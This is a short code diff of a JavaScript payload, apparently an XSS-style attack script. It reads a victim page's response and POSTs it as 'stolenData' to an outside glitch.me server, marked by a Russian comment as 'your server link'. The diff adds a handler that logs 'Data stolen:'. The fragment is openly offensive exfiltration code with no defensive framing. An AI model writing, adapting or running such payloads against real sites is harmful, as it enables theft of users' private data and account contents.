@@ -25,6 +25,16 @@
                     exfil.open('POST', 'https://spangle-leeward-layer.glitch.me', true);  // Ваша ссылка на сервер
                     exfil.setRequestHeader('Content-Type', 'application/json');
                     exfil.send(JSON.stringify({ stolenData: xhr.responseText }));
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4) {
+        if (xhr.status === 200) {
+            console.log('Data stolen:', xhr.responseText);
+        } else {
+            console.error('Failed to fetch data. Status:', xhr.status, 'Response:', xhr.responseText);
+        }
+    }
+};
+
                 }
             };
             xhr.send();
